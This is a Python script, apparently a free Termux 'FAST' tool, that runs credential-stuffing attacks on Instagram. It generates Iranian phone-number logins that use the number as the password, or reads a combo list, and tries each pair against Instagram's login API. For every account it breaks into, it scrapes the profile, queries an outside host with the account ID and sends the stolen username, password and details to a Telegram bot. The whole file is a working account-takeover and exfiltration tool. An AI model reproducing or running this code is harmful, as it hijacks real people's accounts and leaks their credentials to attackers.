""" 
-------------------------------------------------------------------------
- Cod BY : SidraELEzz
- Github : https://github.com/SidraELEzz
- Telegram: https://t.me/SidraTools
- Telegram: https://t.me/tt_rq
-------------------------------------------------------------------------
     
""" 
try:
	import  sys, os, random, time, user_agent,secrets,requests,json,uuid
	from secrets import token_hex
	from uuid import uuid4
except ImportError as Sidraelezz:
	os.system('pip install requests')
	os.system('pip install secrets')
	
	
	

#----------------------------------------------------[colors]----------------------------------------------------#
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"
M = "\033[1;96m"

#----------------------------------------------------[Banner]----------------------------------------------------#
Sidra= f""" 
   {B}███████{M}╗{B}██{M}╗{B}██████{M}╗ {B}██████{M}╗  {B}█████{M}╗ 
   {B}██{M}╔════╝{B}██{M}║{B}██{M}╔══{B}██{M}╗{B}██{M}╔══{B}██{M}╗{B}██{M}╔══{B}██{M}╗
   {B}███████{M}╗{B}██{M}║{B}██{M}║  {B}██{M}║{B}██████{M}╔╝{B}███████{M}║
   {M}╚════{B}██{M}║{B}██{M}║{B}██{M}║  {B}██{M}║{B}██{M}╔══{B}██{M}╗{B}██{M}╔══{B}██{M}║
   {B}███████{M}║{B}██{M}║{B}██████{M}╔╝{B}██{M}║  {B}██{M}║{B}██{M}║  {B}██{M}║
   {M}╚══════╝╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   
                                       
\033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m >  \033[1;91m 
 ----------------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : SIDRA ELEZZ
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : SIDRATOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : TERMUX TOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDRAELEZZ
""" 
Tk = f"""

     {B}███████{M}╗ {B}█████{M}╗ {B}███████{M}╗{B}████████{M}╗
     {B}██{M}╔════╝{B}██{M}╔══{B}██{M}╗{B}██{M}╔════╝╚══{B}██{M}╔══╝
     {B}█████{M}╗  {B}███████{M}║{B}███████{M}╗   {B}██{M}║   
     {B}██{M}╔══╝  {B}██{M}╔══{B}██{M}║╚════{B}██{M}║   {B}██{M}║   
     {B}██{M}║     {B}██{M}║  {B}██{M}║{B}███████{M}║   {B}██{M}║   
     {M}╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝{A} • {C}V-4                                                                                                             
\033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m >  \033[1;91m 
----------------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : SIDRA ELEZZ
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : SIDRATOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : TERMUX TOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDRAELEZZ\033[1;91m 
----------------------------------"""
Tik = f"""

     {B}███████{M}╗ {B}█████{M}╗ {B}███████{M}╗{B}████████{M}╗
     {B}██{M}╔════╝{B}██{M}╔══{B}██{M}╗{B}██{M}╔════╝╚══{B}██{M}╔══╝
     {B}█████{M}╗  {B}███████{M}║{B}███████{M}╗   {B}██{M}║   
     {B}██{M}╔══╝  {B}██{M}╔══{B}██{M}║╚════{B}██{M}║   {B}██{M}║   
     {B}██{M}║     {B}██{M}║  {B}██{M}║{B}███████{M}║   {B}██{M}║   
     {M}╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝{A} • {C}V-4                                                                                                             
\033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m >  \033[1;91m 
----------------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : SIDRA ELEZZ
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : SIDRATOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : TERMUX TOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDRAELEZZ\033[1;91m 
----------------------------------
 \033[1;91m(\033[1;92m1\033[1;91m) \033[1;90m\033[1;97m  CHECK-FROM-IRAN 
 \033[1;91m(\033[1;92m2\033[1;91m) \033[1;90m\033[1;97m  CHECK-FROM-COMBO 
 \033[1;91m(\033[1;92m0\033[1;91m) \033[1;90m\033[1;91m  EXIT  
"""

os.system('clear')


		
re = requests.get("https://pastebin.com/raw/7fdgtGqw")
print (Sidra)
print ("\033[1;92mFIRST STEP OF LOGIN")
print ("\033[1;97m--------------------")
print ("\033[1;97m ") 
password = input('          \033[1;93mTOOL PASSWORD: '+C)
print (E)
if password == "" :
  sys.exit()
if password in str(re.text):
  print(H+" FIRST STEP Is Done. Logged in Successfully as ")
  print ("\033[1;93m ")
  print("\033[1;93mPlease Wait 5 Minutes, All Packages Are Checking.....")
else:
  print (" Wrong Password ⌯")
  os.system('xdg-open https://t.me/SidraTools/1')
  sys.exit()
#----------------------------------------------------[SidraELEzz]----------------------------------------------------#  
os.system('clear')
os.system('rm -rf .txt')
print(Sidra)
token = input(A+"("+E+"⌯"+A+")"+H+ " Enter Token :\n"+C)
ID = input(A+"("+E+"⌯"+A+")"+H+ " Enter ID Tele :\n"+C)
def Cod_SidraELEzz():
	os.system('clear')
	global ID, token 
	ok = 0
	cp = 0
	sk = 0
	print(Tik)
	SidraELEzz=input("\n"+A+" ("+E+"⌯"+A+")"+B+ " Choose Checker :"+C)
	if SidraELEzz=="1":
		os.system('clear')
		os.system('rm -rf .txt')
		print(Tk)
		import time
		def Combo():
			for lik in range(4500):
				Sidra1=random.randint(1000000, 9999999)
				ELEzz0=("+98912"+str(Sidra1)+":0912"+str(Sidra1))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(ELEzz0)+"\n")
				Sidra2=random.randint(1000000, 9999999)
				ELEzz1=("+98913"+str(Sidra2)+":0913"+str(Sidra2))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(ELEzz1)+"\n")
				Sidra3=random.randint(1000000, 9999999)
				ELEzz2=("+98911"+str(Sidra3)+":0911"+str(Sidra3))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(ELEzz2)+"\n")
				Sidra4=random.randint(1000000, 9999999)
				ELEzz3=("+98914"+str(Sidra4)+":0914"+str(Sidra4))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(ELEzz3)+"\n")
				Sidra5=random.randint(1000000, 9999999)
				ELEzz4=("+98915"+str(Sidra5)+":0915"+str(Sidra5))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(ELEzz4)+"\n")
				Sidra6=random.randint(1000000, 9999999)
				ELEzz5=("+98911"+str(Sidra6)+":0911"+str(Sidra6))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(ELEzz5)+"\n")
				Sidra7=random.randint(1000000, 9999999)
				ELEzz6=("+98920"+str(Sidra7)+":0920"+str(Sidra7))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(ELEzz6)+"\n")
				Sidra8=random.randint(1000000, 9999999)
				ELEzz7=("+98921"+str(Sidra8)+":0921"+str(Sidra8))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(ELEzz7)+"\n")
				Sidra9=random.randint(1000000, 9999999)
				ELEzz8=("+98922"+str(Sidra9)+":0922"+str(Sidra9))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(ELEzz8)+"\n")
				Sidra0=random.randint(1000000, 9999999)
				ELEzz9=("+98916"+str(Sidra0)+":0916"+str(Sidra0))
				with open(".txt", "a") as Sidr:
					Sidr.write(str(ELEzz9)+"\n")
				
					
		Combo()
		fil=".txt"
		file=open(fil,"r").read().splitlines()
		for line in file:
			user=line.split(':')[0]
			pw=line.split(':')[1]
			
			Sidracp = ("‹ ɪɴѕᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ 🔐\n. — — — — —  — — — — — . \n‹ ᴜѕᴇʀɴᴀᴍᴇ : "+str(user)+"\n\n‹ ᴘᴀѕѕᴡᴏʀᴅ : "+str(pw)+"\n. — — — — —  — — — — — . \n• @i4mm_dido")
			url = 'https://i.instagram.com/api/v1/accounts/login/'
			headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
			uid = str(uuid4())
			data = {'uuid':uid, 
             'password':pw, 
             'username':user, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
			login = requests.post(url,headers=headers,data=data,allow_redirects=True,verify=True)
			if str("logged_in_user") in login.json():
				ok+=1
				userx = login.json()['logged_in_user']['username']
				try:
					cookiie = secrets.token_hex(8)*2
					head = {
                   'HOST': "www.instagram.com",
                   'KeepAlive' : 'True',
                   'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
                   'Cookie': cookiie,
                   'Accept' : "*/*",
                   'ContentType' : "application/x-www-form-urlencoded",
                   "X-Requested-With" : "XMLHttpRequest",
                   "X-IG-App-ID": "936619743392459",
                   "X-Instagram-AJAX" : "missing",
                   "X-CSRFToken" : "missing",
                   "Accept-Language" : "en-US,en;q=0.9"}
					aip = 'https://www.instagram.com/'+str(userx)+'/?__a=1'
					look = requests.get(aip,headers=head).json()
					id = str(look['graphql']['user']['id'])
					name = str(look['graphql']['user']['full_name'])
					followers = str(look['graphql']['user']['edge_followed_by']['count'])
					following = str(look['graphql']['user']['edge_follow']['count'])
					lok = requests.get("https://o7aa.pythonanywhere.com/?id="+str(id))   
					iok = lok.json()
					daata = iok['data']
				
				except:pass
				Sidraok = ("‹ ɪɴѕᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ✓\n. — — — — —  — — — — — . \n‹ ᴜѕᴇʀɴᴀᴍᴇ : "+str(userx)+"\n‹ ɴᴀᴍᴇ : "+str(name)+"\n‹ ᴘᴀѕѕᴡᴏʀᴅ : "+str(pw)+"\n‹ ғᴏʟʟᴏᴡɪɴɢ : "+str(following)+"\n‹ ғᴏʟʟᴏᴡᴇʀѕ : "+str(followers)+"\n‹ ɪᴅ : "+str(id)+"\n‹ ᴅᴀᴛᴀ  : "+str(daata)+"\n‹ ᴄᴏᴜɴᴛʀʏ : ɪʀᴀɴ 🇮🇷 \n.— — — — —  — — — — — . \n• @i4mm_dido")
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidraok))
				f=open('Ok.txt','a')
				f.write(Sidraok+"\n")
				f.close()
				
			elif str('"message":"challenge_required","challenge"') in login.json():
				cp+=1
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidracp))
			else:
				os.system('clear')
				sk+=1
				print(Tk)
				print(A+"("+E+user+A+")"+H+" : "+A+"("+E+pw+A+")")
				print("{}┌────────────────────────┐ ".format(B))
				print(" {}({}-{}){}  Hacked {} : {}{}".format(A,E,A,E,A,E,str(ok)))
				print(" {}({}-{}){}  Secur{} : {}{}".format(A,K,A,K,A,K,str(cp)))
				print(" {}({}-{}){}  Test dakre {} : {}{}".format(A,H,A,B,A,H,str(sk)))
				print("{}└────────────────────────┘ ".format(B))
				print(H+"Telegram  "+A+" : "+E+"@i4mm_dido")
				
				

	
			

	
	if SidraELEzz=="2":
		os.system('clear')
		os.system('rm -rf .txt')
		import time
		try:
			print(Tk)
			fil= input(A+" ("+E+"⌯"+A+")"+H+ " Enter the file Combo :"+C)
		except:
			print("\n Error !!!!!!!!!")
			os.sys.exit()
		file=open(fil,"r").read().splitlines()
		for line in file:
			user=line.split(':')[0]
			pw=line.split(':')[1]
			
			Sidracp = ("‹ ɪɴѕᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ 🔐\n. — — — — —  — — — — — . \n‹ ᴜѕᴇʀɴᴀᴍᴇ : "+str(user)+"\n\n‹ ᴘᴀѕѕᴡᴏʀᴅ : "+str(pw)+"\n. — — — — —  — — — — — . \n• @i4mm_dido")
			url = 'https://i.instagram.com/api/v1/accounts/login/'
			headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
			uid = str(uuid4())
			data = {'uuid':uid, 
             'password':pw, 
             'username':user, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
			login = requests.post(url,headers=headers,data=data,allow_redirects=True,verify=True)
			if str("logged_in_user") in login.json():
				ok+=1
				userx = login.json()['logged_in_user']['username']
				try:
					cookiie = secrets.token_hex(8)*2
					head = {
                   'HOST': "www.instagram.com",
                   'KeepAlive' : 'True',
                   'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
                   'Cookie': cookiie,
                   'Accept' : "*/*",
                   'ContentType' : "application/x-www-form-urlencoded",
                   "X-Requested-With" : "XMLHttpRequest",
                   "X-IG-App-ID": "936619743392459",
                   "X-Instagram-AJAX" : "missing",
                   "X-CSRFToken" : "missing",
                   "Accept-Language" : "en-US,en;q=0.9"}
					aip = 'https://www.instagram.com/'+str(userx)+'/?__a=1'
					look = requests.get(aip,headers=head).json()
					id = str(look['graphql']['user']['id'])
					name = str(look['graphql']['user']['full_name'])
					followers = str(look['graphql']['user']['edge_followed_by']['count'])
					following = str(look['graphql']['user']['edge_follow']['count'])
					lok = requests.get("https://o7aa.pythonanywhere.com/?id="+str(id))   
					iok = lok.json()
					daata = iok['data']
				
				except:pass
				Sidraok = ("‹ ɪɴѕᴛᴀɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ ✓\n. — — — — —  — — — — — . \n‹ ᴜѕᴇʀɴᴀᴍᴇ : "+str(userx)+"\n‹ ɴᴀᴍᴇ : "+str(name)+"\n‹ ᴘᴀѕѕᴡᴏʀᴅ : "+str(pw)+"\n‹ ғᴏʟʟᴏᴡɪɴɢ : "+str(following)+"\n‹ ғᴏʟʟᴏᴡᴇʀѕ : "+str(followers)+"\n‹ ɪᴅ : "+str(id)+"\n‹ ᴅᴀᴛᴀ  : "+str(daata)+"\n‹ ᴄᴏᴜɴᴛʀʏ : ɪʀᴀɴ 🇮🇷 \n.— — — — —  — — — — — . \n• @i4mm_dido")
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidraok))
				f=open('Ok.txt','a')
				f.write(Sidraok+"\n")
				f.close()
				
			elif str('"message":"challenge_required","challenge"') in login.json():
				cp+=1
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(Sidracp))
			else:
				os.system('clear')
				sk+=1
				print(Tk)
				print(A+"("+E+user+A+")"+H+" : "+A+"("+E+pw+A+")")
				print("{}┌────────────────────────┐ ".format(B))
				print(" {}({}-{}){}  Good {} : {}{}".format(A,E,A,E,A,E,str(ok)))
				print(" {}({}-{}){}  Secur{} : {}{}".format(A,K,A,K,A,K,str(cp)))
				print(" {}({}-{}){}  Test {} : {}{}".format(A,H,A,B,A,H,str(sk)))
				print("{}└────────────────────────┘ ".format(B))
				print(H+"Telegram  "+A+" : "+E+"@i4mm_dido")
				
Cod_SidraELEzz()
""" 
-------------------------------------------------------------------------
- Cod BY : Didar Gamer
- Github : https://github.com/KD69UP/didar_gaming
- Chenal : https://t.me/Didar_Gamer
- Telegram Account : https://t.me/i4mm_dido
-------------------------------------------------------------------------
     
""" 

 